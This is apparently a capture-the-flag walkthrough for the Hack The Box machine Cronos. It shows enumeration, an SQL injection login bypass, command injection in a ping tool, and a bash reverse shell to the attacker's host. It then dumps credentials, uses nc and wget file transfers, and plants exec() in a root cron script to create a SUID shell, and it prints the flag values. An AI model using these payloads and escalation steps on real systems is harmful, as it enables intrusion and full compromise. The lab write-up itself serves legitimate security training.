---
description: 10.10.10.13
---

# Cronos

![](<../../.gitbook/assets/1 (8).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Bypass authentication on admin web page via SQLi in username field. Network tool that provides command execution. Use the functionality to get shell as "www-data".
* Root - PHP script is executed by a Cron job running every minute as root. User "www-data" has write access to the script. Modify script to get command execution as root.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.13
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 09:16 EST
Nmap scan report for 10.10.10.13
Host is up (0.017s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 114.89 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 22,53,80 10.10.10.13 -n                                                     
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-28 09:19 EST
Nmap scan report for 10.10.10.13
Host is up (0.017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   20.94 ms 10.10.14.1
2   21.10 ms 10.10.10.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.13/
http://10.10.10.13/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.13], Title[Apache2 Ubuntu Default Page: It works]                                                 
                                                                         
```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.13/ -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.13
+ Target Hostname:    10.10.10.13
+ Target Port:        80
+ Start Time:         2021-11-28 09:21:27 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2caf, size: 5b7cbd6fbb19d, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26470 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-11-28 09:30:42 (GMT-5) (555 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.13/ -q -f -t 100 -x php,sh,bak,txt
/icons/ (Status: 403)
/server-status/ (Status: 403)

```

### ​Dig

The target is listening on TCP 53, let's see if we can extract any records from the DNS server:

```
└─$ dig -x 10.10.10.13 @10.10.10.13 +nocmd +noall +answer
13.10.10.10.in-addr.arpa. 604800 IN     PTR     ns1.cronos.htb.

└─$ dig cronos.htb axfr @10.10.10.13 +nocmd +noall +answer
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
                                                                                                                                                                                 
```

There are a number of hostnames associated with the target. Let's add these to our /etc/hosts file as follows:

```
└─$ cat /etc/hosts | grep cronos                                                                              1 ⨯
10.10.10.13     admin.cronos.htb www.cronos.htb

```

### Gobuster

Let's re-run gobuster against these two new hostnames for the target:

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://admin.cronos.htb/ -q -f -t 100 -x php,sh,bak,txt
/welcome.php (Status: 302)
/icons/ (Status: 403)
/logout.php (Status: 302)
/index.php (Status: 200)
/config.php (Status: 200)
/session.php (Status: 302)
/server-status/ (Status: 403)

└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://www.cronos.htb/ -q -f -t 100 -x php,sh,bak,txt
/index.php (Status: 200)
/icons/ (Status: 403)
/css/ (Status: 200)
/js/ (Status: 200)
/robots.txt (Status: 200)
/server-status/ (Status: 403)

```

There are a few pages to check out from the output above. We'll explore those next.

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* Nothing found in the page source for www or admin
* The www site is running Laravel, and both sites are using PHP

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing found in the scripts for www or admin

#### ​Browsing

Let's check out the website at [http://www.cronos.htb/](http://www.cronos.htb)

![](<../../.gitbook/assets/3 (7).JPG>)

Let's check out the website at [http://admin.cronos.htb/](http://admin.cronos.htb)

![](<../../.gitbook/assets/2 (5).JPG>)

We try some basic creds including the following, all without success:

> admin:admin
>
> admin:adminadmin
>
> admin:password
>
> admin:cronos
>
> cronos:cronos

### Command Execution via SQLi:

Let's test the login form for SQLi:

> admin' or 1=1-- -
>
> admin' or '1'='1-- -
>
> admin') or '1'='1-- -

![](<../../.gitbook/assets/9 (5).JPG>)

Using the first entry above, we bypass the login form, to find a network tool.

![](<../../.gitbook/assets/10 (2).JPG>)

Let's see if we can execute commands with this tool by trying the following:

> 10.10.14.6 -c 1;id

![](<../../.gitbook/assets/11 (3).JPG>)

We have command execution on the target.

### Command Execution (without SQLi):

Let's check out the pages that gobuster found.

> /welcome.php --> redirects to index.php
>
> /config.php --> loads but nothing returned
>
> /session.php --> redirects to index.php

Let's start BURP and configure the browser to use it as a proxy. Revisit all the pages at both websites and let's take a look at the responses in the Proxy --> HTTP history tab in BURP.

![](<../../.gitbook/assets/4 (2).JPG>)

We can see that the response from the page at "/welcome.php" contains a form with some network tools. The form method is "POST", so let's send this request to repeater and change it to a "POST" request by right clicking anywhere in the request pane and selecting "Change request method". After clicking "Go", we can see that the request is still being redirected, however, if we "Render" the page, we can see the tool:

![](<../../.gitbook/assets/5 (3).JPG>)

We can test it by starting a tcpdump (or wireshark) capture on our attacker system, and sending the request as follows:

![](<../../.gitbook/assets/7 (3).JPG>)

```
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:55:23.898583 IP admin.cronos.htb > 10.10.14.6: ICMP echo request, id 1479, seq 1, length 64
10:55:23.898619 IP 10.10.14.6 > admin.cronos.htb: ICMP echo reply, id 1479, seq 1, length 64
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel

```

We have command execution on the target.

## Gaining Access

Let's see if we can get a reverse shell using this RCE. Start a netcat listener, and back in BURP, URL encode the following payload, before sending it:

> bash -c 'bash -i >& /dev/tcp/10.10.14.6/8888 0>&1'

![](<../../.gitbook/assets/8 (4).JPG>)

In our listener, we get a shell as "www-data":

```
└─$ nc -nvlp 8888                         
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:41540.
bash: cannot set terminal process group (1376): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cronos:/var/www/admin$ 

```

## Enumeration as "www-data"

We land in the /var/www/admin directory. Let's have a look at the config.php file in here.

```
www-data@cronos:/var/www/admin$ ls -la
ls -la
total 32
drwxr-xr-x 2 www-data www-data 4096 Jan  1  2021 .
drwxr-xr-x 5 root     root     4096 Apr  9  2017 ..
-rw-r--r-- 1 www-data www-data 1024 Apr  9  2017 .welcome.php.swp
-rw-r--r-- 1 www-data www-data  237 Apr  9  2017 config.php
-rw-r--r-- 1 www-data www-data 2531 Jan  1  2021 index.php
-rw-r--r-- 1 www-data www-data  102 Apr  9  2017 logout.php
-rw-r--r-- 1 www-data www-data  383 Apr  9  2017 session.php
-rw-r--r-- 1 www-data www-data  782 Apr  9  2017 welcome.php
www-data@cronos:/var/www/admin$ cat config.php
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
www-data@cronos:/var/www/admin$ netstat -antp
netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 10.10.10.13:53          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               
tcp        0    295 10.10.10.13:41540       10.10.14.6:8888         ESTABLISHED 1562/bash       
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       1      0 10.10.10.13:80          10.10.14.6:60918        CLOSE_WAIT  -               
www-data@cronos:/var/www/admin$ 
```

The "config.php" file contains creds for the database running locally, and the netstat output confirms there is a database running locally on port 3306. Let's connect to the database and see if we can find anything useful.

```
www-data@cronos:/var/www/admin$ mysql -u admin -p
mysql -u admin -p
Enter password: kEjdbRigfBHUREiNSDs

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use admin;
use admin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

mysql> exit
exit
Bye
www-data@cronos:/var/www/admin$ 
```

We find a MD5 hash for the "admin" account, but we are unable to crack it.

We can also try and switch user using the database password we found, however, this doesn't work either:

```
www-data@cronos:/var/www/admin$ cat /etc/passwd | grep "/bin/bash"
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
www-data@cronos:/var/www/admin$ su noulis
su noulis
Password: kEjdbRigfBHUREiNSDs

su: Authentication failure
www-data@cronos:/var/www/admin$ su -
su -
Password: kEjdbRigfBHUREiNSDs

su: Authentication failure
www-data@cronos:/var/www/admin$
```

Let's check out the home directories. The only one there is for the user "noulis", and it contains the user flag, which we can read.

```
www-data@cronos:/var/www/admin$ cd /home
cd /home
www-data@cronos:/home$ ls -a
ls -a
.  ..  noulis
www-data@cronos:/home$ cd noulis
cd noulis
www-data@cronos:/home/noulis$ ls -a
ls -a
.              .bash_logout  .composer       .selected_editor
..             .bashrc       .mysql_history  .sudo_as_admin_successful
.bash_history  .cache        .profile        user.txt
www-data@cronos:/home/noulis$ cat user.txt
cat user.txt
51d236438b333970dbba7dc3089be33b
www-data@cronos:/home/noulis$ 
```

Let's check the crontab:

```
www-data@cronos:/home/noulis$ cd /etc
cd /etc
www-data@cronos:/etc$ ls -la cron*
ls -la cron*
-rw-r--r-- 1 root root  797 Apr  9  2017 crontab

cron.d:
total 24
drwxr-xr-x  2 root root 4096 Mar 22  2017 .
drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest

cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Apr  9  2017 .
drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 22  2017 .
drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 22  2017 .
drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Apr  9  2017 .
drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common

www-data@cronos:/etc$ cat crontab
cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
www-data@cronos:/etc$ 
```

The last entry in the crontab looks insteresting. It is being run by root every minute.

```
www-data@cronos:/etc$ ls -la /var/www/laravel/artisan
ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
www-data@cronos:/etc$ file /var/www/laravel/artisan
file /var/www/laravel/artisan
/var/www/laravel/artisan: a /usr/bin/env php script, ASCII text executable
wwww-data@cronos:/etc$ cat /var/www/laravel/artisan
cat /var/www/laravel/artisan
#!/usr/bin/env php
<?php

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
| for our application. We just need to utilize it! We'll require it
| into the script here so that we do not have to worry about the
| loading of any our classes "manually". Feels great to relax.
|
*/

require __DIR__.'/bootstrap/autoload.php';

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Artisan Application
|--------------------------------------------------------------------------
|
| When we run the console application, the current CLI command will be
| executed in this console and the response sent back to a terminal
| or another output device for the developers. Here goes nothing!
|
*/

$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);

$status = $kernel->handle(
    $input = new Symfony\Component\Console\Input\ArgvInput,
    new Symfony\Component\Console\Output\ConsoleOutput
);

/*
|--------------------------------------------------------------------------
| Shutdown The Application
|--------------------------------------------------------------------------
|
| Once Artisan has finished running. We will fire off the shutdown events
| so that any final work may be done by the application before we shut
| down the process. This is the last thing to happen to the request.
|
*/

$kernel->terminate($input, $status);

exit($status);
www-data@cronos:/etc$ 
```

Our user "www-data" has write privileges on the "/var/www/laravel/artisan" file, which should allow us to get command execution as root, and consequently escalate our privileges.

## Privilege Escalation

Since we don't have a fully interactive shell, we can't use "vi" or "nano" to edit the "artisan" file.&#x20;

{% hint style="info" %}
NOTE: There are multiple ways to abuse this scenario to escalate privileges. Below we are demonstrating one way of doing it, which may or may not be the best/easiest way, but it for the purposes of privilege escalation on this box it will suffice.
{% endhint %}

The plan to escalate our privileges is as follows:

* Create a shell script to execute commands to create a SUID binary we can use.
* Transfer the "artisan" file to our attacker box, modify it, and transfer it back to the target.&#x20;
* Wait for the cron job to run, verify our exploit worked and get a shell as root.

Create the shell script that will be executed when the cron job runs the "artisan" PHP script:

```
www-data@cronos:/var/www/laravel$ cat <<EOF > /var/www/laravel/priv.sh
cat <<EOF > /var/www/laravel/priv.sh
> #!/bin/bash
#!/bin/bash
> cp /bin/bash /var/www/laravel/priv; chown root:root /var/www/laravel/priv; chmod u+s /var/www/laravel/priv
< /var/www/laravel/priv; chmod u+s /var/www/laravel/priv                     
> EOF
EOF
www-data@cronos:/var/www/laravel$ ls -la priv.sh
ls -la priv.sh
-rw-r--r-- 1 www-data www-data 119 Nov 29 12:29 priv.sh
www-data@cronos:/var/www/laravel$ chmod +x priv.sh
chmod +x priv.sh
www-data@cronos:/var/www/laravel$ ls -la priv.sh
ls -la priv.sh
-rwxr-xr-x 1 www-data www-data 119 Nov 29 12:29 priv.sh
www-data@cronos:/var/www/laravel$ cat priv.sh
cat priv.sh
#!/bin/bash
cp /bin/bash /var/www/laravel/priv; chown root:root /var/www/laravel/priv; chmod u+s /var/www/laravel/priv
www-data@cronos:/var/www/laravel$ 
```

Transfer the "artisan" file to our attacker machine, modify it and send it back.

On the target:

```
www-data@cronos:/var/www/laravel$ nc -nv 10.10.14.6 9898 < artisan
nc -nv 10.10.14.6 9898 < artisan
Connection to 10.10.14.6 9898 port [tcp/*] succeeded!
www-data@cronos:/var/www/laravel$
```

On our attacker machine:

```
└─$ nc -nvlp 9898 > artisan
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9898
Ncat: Listening on 0.0.0.0:9898
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:53856.
                                       
```

Modify the file by adding a line of PHP code. We'll use the "exec" function to execute our shell script:

```
└─$ head -4 artisan
#!/usr/bin/env php
<?php
exec('/var/www/laravel/priv.sh');
/*
                   
```

Send the file back to the target:

On the attacker machine:

```
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.13 - - [29/Nov/2021 05:34:04] "GET /artisan HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                          
```

On the target:

```
www-data@cronos:/var/www/laravel$ mv artisan artisan.old
mv artisan artisan.old
www-data@cronos:/var/www/laravel$ wget 10.10.14.6:8000/artisan
wget 10.10.14.6:8000/artisan
--2021-11-29 12:34:24--  http://10.10.14.6:8000/artisan
Connecting to 10.10.14.6:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1671 (1.6K) [application/octet-stream]
Saving to: 'artisan'

artisan             100%[===================>]   1.63K  --.-KB/s    in 0s      

2021-11-29 12:34:24 (261 MB/s) - 'artisan' saved [1671/1671]

www-data@cronos:/var/www/laravel$ ls -la artisan
ls -la artisan
-rw-r--r--  1 www-data www-data    1671 Nov 29 12:35 artisan
www-data@cronos:/var/www/laravel$ chmod +x artisan
chmod +x artisan
www-data@cronos:/var/www/laravel$ ls -la artisan
ls -la artisan
-rwxr-xr-x  1 www-data www-data    1671 Nov 29 12:35 artisan
www-data@cronos:/var/www/laravel$ 
```

Wait up to a minute for the cron job to run. Once it has run, there should be a SUID binary called "priv" in the directory:

```
www-data@cronos:/var/www/laravel$ ls -la priv
ls -la priv
-rwsr-xr-x  1 root     root     1037528 Nov 29 12:36 priv
www-data@cronos:/var/www/laravel$ 
```

Finally, we can run the new SUID binary to get a shell as root, and grab the root flag:

```
www-data@cronos:/var/www/laravel$ ./priv -p
./priv -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
cat /root/root.txt
1703b8a3c9a8dde879942c79d02fd3a0

```

## Resources

{% embed url="https://laravel.com/docs/8.x/scheduling" %}
